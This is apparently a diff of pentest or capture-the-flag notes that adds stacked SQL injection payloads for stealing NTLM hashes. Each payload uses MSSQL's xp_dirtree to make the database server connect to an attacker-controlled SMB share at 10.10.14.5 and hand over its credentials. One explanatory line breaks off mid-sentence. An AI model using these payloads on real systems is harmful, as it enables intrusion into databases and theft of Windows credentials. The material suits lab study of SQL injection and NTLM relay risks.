@@ -8,5 +8,11 @@
 
 **GETTING NTLM HASH WITH STACKED SQLi QUERY**
 
+```SQL
+8 ; EXEC master..xp_dirtree '\\10.10.14.5\test'--
 ```
+
+- THE `'` gives <mark class="hltr-mycolor">undisclosed quotation</mark> error the a
+```SQL
+8'; EXEC master..xp_dirtree '\\10.10.14.5\test'--
 ```
